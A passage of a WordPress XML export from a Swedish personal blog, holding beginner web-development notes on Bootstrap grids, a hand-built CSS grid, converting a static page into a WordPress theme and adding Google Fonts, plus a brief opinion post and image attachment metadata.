I detta exempel så defineras row med att ha ett block med 12 kolumner. xs (mobil) sm (mobil/padda) md (laptop) xs (stor skärm). Det vill säga, regeln för den minsta devicen bestämmer avgör reglerna för större divices. Om vi till exempel vill att textblocken i exemplet ovan skall ligga bredvid varandra när vi besöker hemsidan från en laptop så ändrar man till följande kod.
[code language="html"]
&lt;div class=&quot;row&quot;&gt;
&lt;div class=&quot;col-xs-12 col-md-6&quot;&gt;
&lt;p&gt;Här är en kolumn per rad&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;col-xs-12 col-md-6&quot;&gt;
&lt;p&gt;Här är en till rad&lt;/p&gt;
[/code]

<h2>Normalize Bootstrap</h2>
Eftersom olika browsers är byggda på olika sätt, men egna unika default-inställning kan sidor se olika ut på olika sidor. Därför är det vanligt att ha med en normalize.css-fil bland css-filerna. Dessa tar bort browserna specialinställningar.

Detta är dock inte nödvändigt om du använder bootstrap eftersom bootstrap har normalize.css inbyggt in sin css-fil.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1645</wp:post_id>
		<wp:post_date>2015-05-19 19:15:06</wp:post_date>
		<wp:post_date_gmt>2015-05-19 19:15:06</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>boostrap</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="bootstrap"><![CDATA[bootstrap]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10859363778]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[286]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[286]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Plan för att göra en hemsida</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/21/plan-for-att-gora-en-hemsida/</link>
		<pubDate>Thu, 21 May 2015 00:43:09 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=298</guid>
		<description></description>
		<content:encoded><![CDATA[Gör en design för sidan du vill göra. När du har en övergripande design gör såhär.

1. Kolla efter alla naturliga boxar. Bilder, texter, ikoner.
2. Titta efter semantiska element och stiler som upprepar sig. Typ h1,h2, header, footer.
3. Skriv html-koden.
4. Lägg till CSS. Från de största objekten först.
5. Fixa småsaker.
6. Kontrollera html-koden <a href="https://validator.w3.org/#validate_by_input">här</a> och css-koden <a href="https://jigsaw.w3.org/css-validator/#validate_by_input">här</a>.
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1646</wp:post_id>
		<wp:post_date>2015-05-21 00:43:09</wp:post_date>
		<wp:post_date_gmt>2015-05-21 00:43:09</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>plan-for-att-gora-en-hemsida</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[298]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[298]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Skapa ett grid-system enligt Bootstrap-modellen</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/21/skapa-ett-grid-system-enligt-bootstrap-modellen/</link>
		<pubDate>Thu, 21 May 2015 16:41:45 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=303</guid>
		<description></description>
		<content:encoded><![CDATA[Den bästa förklaringen för hur ett grid-system bör byggas är av <a href="https://www.udacity.com/course/viewer#!/c-ud304/l-2810388540/e-2872198559/m-2870208566">Udacity</a>.

Det är inte helt enkelt att positionera element på en sida. Det bästa sättet för att få tydligt kontroll över elementens position är att skapa ett grid. Alltså ett nät av kolumner. Det vanligaste och bästa sättet är att skapa ett grid med tolv kolumner. Eftersom tolv är ett nummer som kan delas på många olika sätt 12/6, 12/4, 12/3, 12/2. 

För att göra gridet responsivt bör det skrivas i procent och inte i pixel.

[code language="html"]
&lt;!DOCTYPE html&gt;

&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot;&gt;
        &lt;title&gt;Projekt 2&lt;/title&gt;
        &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
    &lt;/head&gt;

    &lt;body&gt;

        &lt;h1&gt;Framework test page&lt;/h1&gt;

        &lt;div class=&quot;grid&quot;&gt;
            &lt;div class=&quot;row&quot;&gt;
                &lt;div class=&quot;col-2&quot;&gt;Two columns&lt;/div&gt;
                &lt;div class=&quot;col-10&quot;&gt;Ten columns&lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;row&quot;&gt;
                &lt;div class=&quot;col-3&quot;&gt;Three columns&lt;/div&gt;
                &lt;div class=&quot;col-9&quot;&gt;Nine columns&lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;row&quot;&gt;
                &lt;div class=&quot;col-4&quot;&gt;Four columns&lt;/div&gt;
                &lt;div class=&quot;col-8&quot;&gt;Eight columns&lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;row&quot;&gt;
                &lt;div class=&quot;col-6&quot;&gt;Six columns&lt;/div&gt;
                &lt;div class=&quot;col-6&quot;&gt;Six columns&lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;row&quot;&gt;
                &lt;div class=&quot;col-7&quot;&gt;Seven columns&lt;/div&gt;
                &lt;div class=&quot;col-5&quot;&gt;Five columns&lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;row&quot;&gt;
                &lt;div class=&quot;col-8&quot;&gt;Eight columns&lt;/div&gt;
                &lt;div class=&quot;col-4&quot;&gt;Four columns&lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt; 
    &lt;/body&gt;
&lt;/html&gt;
[/code]


Och här är CSS

[code language="css"]

* {
    border: 1px solid red !important;
}
* {
    box-sizing: border-box;
}
.grid {
    margin: 0 auto;
}
.row {
    display: flex;
    flex-wrap: wrap;
    width: 100%;
}
.col-1 {
    width: 8.33%;
}
.col-2 {
    width: 16.66%;
}
.col-3 {
    width: 25%;
}
.col-4 {
    width: 33.33%;
}
.col-5 {
    width: 41.66%;
}
.col-6 {
    width: 50%;
}
.col-7 {
    width: 58.33%;
}
.col-8 {
    width: 66.66%;
}
.col-9 {
    width: 74.99%;
}
.col-10 {
    width: 83.33%;
}
.col-11 {
    width: 91.66px;
}
.col-12 {
    width: 100%;
}
h1 {
    color: green;
}
[/code]

Så gird-systemet består helt enkelt av en row och kolumner. Kolumnerna kan implementeras på många olika sätt. För att divvarna ska hamna bredvid varandra, och inte under varandra behöver man lägga till attributet <strong>display</strong> i elementet <strong>.row</strong>, och ge det värdet: <strong>flex; wrap-flex: wrap;</strong>. Se koden ovan.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1647</wp:post_id>
		<wp:post_date>2015-05-21 16:41:45</wp:post_date>
		<wp:post_date_gmt>2015-05-21 16:41:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>skapa-ett-grid-system-enligt-bootstrap-modellen</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="bootstrap"><![CDATA[bootstrap]]></category>
		<category domain="category" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10857592354]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[303]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[303]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Gör statis bootstrap-sida wordpress-kompatibel</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/23/gor-statis-bootstrap-sida-wordpress-kompatibel/</link>
		<pubDate>Sat, 23 May 2015 01:02:39 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=314</guid>
		<description></description>
		<content:encoded><![CDATA[Det krävs en del knep å knåpande för att få en statisk html-sida att fungera i Wordpress.

<h2>1. Skapa tema-mapp</h2>

Skapa en mapp i wp-content/themes/Saft. Jag har valt att kalla vårt låtsastema för Saft i den här övningen.
<h2>2. Skapa style.css</h2>
I mappen saft måste du lägga till filen style.css. Det smidigaste är att du tar din .css-fil som du har använt och helt enkelt byter namn på den till style.css. Därefter kopierar du in följande kod längst upp i style.css. Fast men din egen info såklart.

[code language="css"]
/*
Theme Name: Saft
Theme URI: http://www.saft.com
Author: Ditt namn
Author URI: https://www.saft.com
Description: Single page website. 
Version: 1.0
License: GNU General Public License v2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html
Tags: images, scroll
This theme is licensed under the GPL.
Use it to make something cool, have fun, and share what you've learned with others.
*/
[/code]

De flesta av de här uppgifterna tror jag är frivilliga. Det enda som är absolut nödvändigt är att ha Theme name.

<h2>3. Dela upp index.html-filen.</h3>
Wordpress är konstruerat så att header och footer är desamma på alla sidor. Om du klickar på en bloggpost så kommer header och footer antagligen se likadana ut som på första sidan. Det är för att index-filen är uppdelad.
<ul>
<li> Eftersom vi kommer använda oss av programmeringsspråket php så behöver du ändra namn på dina filer. byt namn på index.html till index.php.</li>
<li> Klipper du ut alla rader i index.php som ingår i headern. Vanligtvis från html-taggen ner till efter menyn och din header. Klipp ut det och klistra in det i filen header.php. Filen måste heta exakt så för att wordpress ska förstå den.</li>
<li> Gör samma sak med footer-koden. Lägg all kod som hör till footern i footer.php</li>
<li>Om du har en sidebar så gör samma sak med den koden. Klipp ut den och lägg den i sidebar.php</li>
</ul>

<h2>4. Lägg upp det på din server.</h2> 
Om du behöver hjälp med ftp-kommandon se här. Filerna ska ligga i mappen /wp-content/themes/Saft.

<h2>5. Aktivera temat </h2>
Sådär, nu kan du logga in på sidan via wordpress-loginen som vanligtvis är saft.com/wp-admin.

<h2>6. Knyt ihop. </h2>
Så, om du nu går in på din hemsida så ser du att din header och footer inte visas. För att visa den måste du redigera index.php-filen.

Precis i början av filen lägger du därför till.
[code language="php"]
&lt;?php get_header(); ?&gt;
[/code]

I slutet av index.php lägger du till 

[code language="php"]
&lt;?php get_sidebar(); ?&gt;
[/code]

[code language="php"]
&lt;?php get_footer(); ?&gt;
[/code]

Man kan säga att dessa små koder är som länkar som binder samman filerna. Om du sprarar index.php å går till din hemsida kan du nu se header och footer.

<h2>7. Css </h2>
Sådär, nu är sidans innehåll på plats. Men sidan har ingen CSS. För att koppla in css måste du gå in i header.php och lägga till följande kod.

[code language="html"]
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; href=&quot;&lt;?php bloginfo( 'stylesheet_url' ); ?&gt;&quot; /&gt;
[/code]

Såhär, om du nu går in på hemsidan så ska sidan ha fått sin css. I alla fall style.css. Men för att koppla ihop bootstrap-css måste du lägga till följande kod.
[code language="html"]

&lt;link rel=&quot;stylesheet&quot; href=&quot;&lt;?php bloginfo('stylesheet_directory'); ?&gt;/css/bootstrap.min.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
[/code]


<h2>Bilder</h2>
Dina bilder har nu en ny plats på servern. Därför måste du ändra bildadresserna i din html-kod.

Om du har lagt till bilderna direkt i html-koden måste du ändra till följande adress:
wp-content/themes/saft/img/bild.jpg eller den korrekta adressen. Men bildens adress skall börja från wp-content.

Exempel:
[code language="html"]
&lt;img src=&quot;wp-content/themes/butikboot/img/web.png&quot; class&quot;img-responsive&quot; alt=&quot;Cinque Terre&quot;&gt;
[/code]

Om du däremot har lagt till bilderna från ditt stylesheet så blir adressen relativ i förhållande till ditt style.css-dokument. Därför ska adressen börja vara img/bild.jpg.
Det skall exempelvis se ut såhär:

[code language="css"]
background:url(img/28H.jpg) no-repeat center center fixed;
[/code]

Om du skriver in adressen korrekt men det ändå inte händer något. Bilderna inte laddas, så kan det vara ett problem med att gamla css har cachats på servern. För att lösa det problemet, kolla min bloggpost om det <a href="https://narcotize.wordpress.com/2015/04/14/langsam-uppdatering-av-css/">här</a>.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1648</wp:post_id>
		<wp:post_date>2015-05-23 01:02:39</wp:post_date>
		<wp:post_date_gmt>2015-05-23 01:02:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>gor-statis-bootstrap-sida-wordpress-kompatibel</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="bootstrap"><![CDATA[bootstrap]]></category>
		<category domain="category" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10908282602]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[314]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[314]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Batonger som symbol</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/23/batonger-som-symbol/</link>
		<pubDate>Sat, 23 May 2015 17:17:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=322</guid>
		<description></description>
		<content:encoded><![CDATA[Man borde sätta upp statyer av batonger på varje plats där polisen har misshandlat någon. Minnesmärken för allt polisvåld. I Tjeckien gör dom det. http://www.svtplay.se/video/2778481/kobra/kobra-avsnitt-3]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1649</wp:post_id>
		<wp:post_date>2015-05-23 17:17:00</wp:post_date>
		<wp:post_date_gmt>2015-05-23 17:17:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>batonger-som-symbol</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10931373919]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[322]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[322]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>IMG_0135</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/img_0135/</link>
		<pubDate>Mon, 11 May 2015 18:59:52 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">http://stuffidontwanttogoogleagain.files.wordpress.com/2015/05/img_0135.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1678</wp:post_id>
		<wp:post_date>2015-05-11 18:59:52</wp:post_date>
		<wp:post_date_gmt>2015-05-11 18:59:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>img_0135</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>https://stuffidontwanttogoogleagain.files.wordpress.com/2015/05/img_0135.jpg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/05/img_0135.jpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1536;s:6:"height";i:1536;s:4:"file";s:85:"/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/05/img_0135.jpg";s:5:"sizes";a:0:{}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"1";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_parent</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[202]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_original_import_url</wp:meta_key>
			<wp:meta_value><![CDATA[https://narcotize.files.wordpress.com/2015/05/img_0135.jpg]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>cropped-img_0135.jpg</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/cropped-img_0135-jpg/</link>
		<pubDate>Mon, 11 May 2015 19:00:05 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">http://stuffidontwanttogoogleagain.files.wordpress.com/2015/05/cropped-img_0135.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[http://narcotize.files.wordpress.com/2015/05/cropped-img_0135.jpg]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1679</wp:post_id>
		<wp:post_date>2015-05-11 19:00:05</wp:post_date>
		<wp:post_date_gmt>2015-05-11 19:00:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cropped-img_0135-jpg</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>https://stuffidontwanttogoogleagain.files.wordpress.com/2015/05/cropped-img_0135.jpg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/05/cropped-img_0135.jpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:5:{s:5:"width";i:954;s:6:"height";i:1300;s:4:"file";s:93:"/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/05/cropped-img_0135.jpg";s:5:"sizes";a:0:{}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_parent</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[203]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_context</wp:meta_key>
			<wp:meta_value><![CDATA[custom-header]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_custom_header_last_used_pub/coherent</wp:meta_key>
			<wp:meta_value><![CDATA[1431370806]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_is_custom_header</wp:meta_key>
			<wp:meta_value><![CDATA[pub/coherent]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_original_import_url</wp:meta_key>
			<wp:meta_value><![CDATA[https://narcotize.files.wordpress.com/2015/05/cropped-img_0135.jpg]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Google Fonts i Wordpress</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/25/google-fonts-i-wordpress/</link>
		<pubDate>Mon, 25 May 2015 21:16:38 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=342</guid>
		<description></description>
		<content:encoded><![CDATA[För att google fonts ska funka väl i wordpress så måste du lägga till den som en funktion i din functions.php-fil.

Gå in i google fonts, leta reda på den du vill ha. Ta adressen som du ska använda i länk-taggen. Å klistra in länken här istället.

[code language="php"]

&lt;?php
function load_fonts() {
            wp_register_style('et-googleFonts', 'http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,700italic,400,700,300');
            wp_enqueue_style( 'et-googleFonts');
        }
    add_action('wp_print_styles', 'load_fonts');
?&gt;
[/code]

Lägg in adressen där adressen är. 
Sen får du lägga till fonten som font-family i din css.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>342</wp:post_id>
		<wp:post_date>2015-05-25 21:16:38</wp:post_date>
		<wp:post_date_gmt>2015-05-25 21:16:38</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>google-fonts-i-wordpress</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="google-font"><![CDATA[google font]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11005380471]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[342]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[342]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Lägga till Favicon i Wordpress</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/29/lagga-till-favicon-i-wordpress/</link>
		<pubDate>Fri, 29 May 2015 03:41:27 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=346</guid>
		<description></description>
		<content:encoded><![CDATA[Favicon är den lilla ikonen bredvid titeln på hemsidan. För att lägga till en sådan ikon i Wordpress gör du bara följande.

